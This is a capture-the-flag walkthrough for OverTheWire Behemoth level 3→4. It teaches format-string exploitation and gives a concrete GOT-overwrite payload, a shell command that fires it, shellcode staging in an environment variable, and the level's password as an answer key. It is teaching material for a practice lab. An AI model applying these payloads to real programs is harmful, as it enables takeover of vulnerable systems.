# Behemoth Level 3 → 4

## Goal

`behemoth3` takes your input and passes it directly to `printf` — a classic **format-string vulnerability**. You can leak stack values with `%x`, and you can *write* memory with `%n`. The exploit here overwrites a function pointer in the GOT (Global Offset Table) to redirect execution to shellcode you've planted in an environment variable.

This is the hardest Behemoth level up to this point. Don't skip the methodology — the specific addresses will be different on any binary you haven't just analysed.

## Concepts you'll learn

- What a format-string bug is: `printf(user_input)` lets the user control the format string, leaking memory with `%x`/`%s` and writing memory with `%n`
- The **GOT** (Global Offset Table): a table of function pointers that gets populated at runtime and is writable
- Using direct-parameter access (`%N$...`) to target a specific stack slot
- Splitting a 4-byte write into two 2-byte writes with `%hn`

## Walkthrough

### 1. Confirm the format-string bug

```bash
$ cd /behemoth
$ ./behemoth3
Please enter your message: %x %x %x %x
```

Instead of echoing `%x %x %x %x`, the program prints hex numbers — the raw values at stack offsets. That's the smoking gun.

### 2. Find where your input sits on the stack

Feed a predictable tag and count `%x`s until you see it:

```bash
$ ./behemoth3
Please enter your message: AAAA %x %x %x %x %x %x %x %x %x %x %x %x
```

When the 7th-ish `%x` prints `41414141`, that's your `AAAA` — which means your input is the Nth argument from `printf`'s view. With direct-parameter access, you can target this slot later as `%N$...`.

### 3. Find the GOT entry to overwrite

After `printf` returns, the program calls another libc function (often `puts`, `exit`, or similar). Each of those has a GOT entry, and the GOT is writable. Dump the relocations:

```bash
$ objdump -R ./behemoth3 | head
...
080497ac R_386_JUMP_SLOT   puts@GLIBC_2.0
...
```

In axcheron's walkthrough, `puts@plt` had its GOT entry at **`0x080497ac`**. Yours may differ; trust the output of `objdump -R`.

### 4. Stage shellcode and find its address

Same technique as [level 1 → 2](level01.md):

```bash
$ export EGG=$(python -c 'import sys; sys.stdout.buffer.write(b"\x90"*200 + b"<24-byte shellcode>")')
$ /tmp/getenv EGG /behemoth/behemoth3
EGG = 0xffffdXXX
```

Pick an address a bit inside the NOP sled (say `0xffffd6b8`).

### 5. Write the shellcode address into the GOT entry with a format string

The classic `%n` trick: `%n` writes the number of bytes printed so far into the address whose value is at the current parameter. To write an arbitrary 4-byte value, you:

1. Put the **two addresses** you want to write into (low half of GOT, high half of GOT) at the start of your payload — those are 8 bytes
2. Pad the output until printed-byte count equals the *low 2 bytes* of your target address, then use `%hn` (2-byte write) into the first address
3. Pad again until printed-byte count equals the *high 2 bytes* of your target address, then `%hn` into the second address

A payload shape (numbers are illustrative, not correct — you must recompute):

```
[ 0xac 0x97 0x04 0x08 ][ 0xae 0x97 0x04 0x08 ]%NUMBER1x%P$hn%NUMBER2x%Q$hn
```

- `0x080497ac` is the GOT entry (low half target). `0x080497ae` is that address + 2 (high half target).
- `%NUMBER1x` pads the byte count to the low half of the shellcode address; `%P$hn` writes it.
- `%NUMBER2x` pads up to the high half; `%Q$hn` writes it.
- `P` and `Q` are the 1-based parameter indices of the two address words you put at the start.

Axcheron's exact payload was:

```
"\xac\x97\x04\x08\xae\x97\x04\x08%56941x%1$hn%8586x%2$hn"
```

Adapt the numeric widths and `$hn` offsets to your own shellcode address and your own parameter offset (from step 2). Scripts like `pwntools` have an `fmtstr_payload` helper that automates this.

### 6. Fire

```bash
$ ./behemoth3 < <(python -c 'import sys; sys.stdout.buffer.write(b"\xac\x97\x04\x08\xae\x97\x04\x08%56941x%1$hn%8586x%2$hn")')
```

When `printf` returns and the program calls `puts`, control flows to your shellcode.

```bash
$ whoami
behemoth4
$ cat /etc/behemoth_pass/behemoth4
ietheishei
```

> If any of the steps above feel opaque on a first read, it's because format-string exploitation genuinely is the steepest learning curve in Behemoth. It's worth writing a tiny vulnerable C program on your own machine, running it under `gdb`, and proving each primitive (leak with `%x`, leak a string with `%s`, write with `%n`) in isolation before stringing them together for this level.

## The answer

The password for `behemoth4` is:

**`ietheishei`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/behemoth/behemoth3.html>
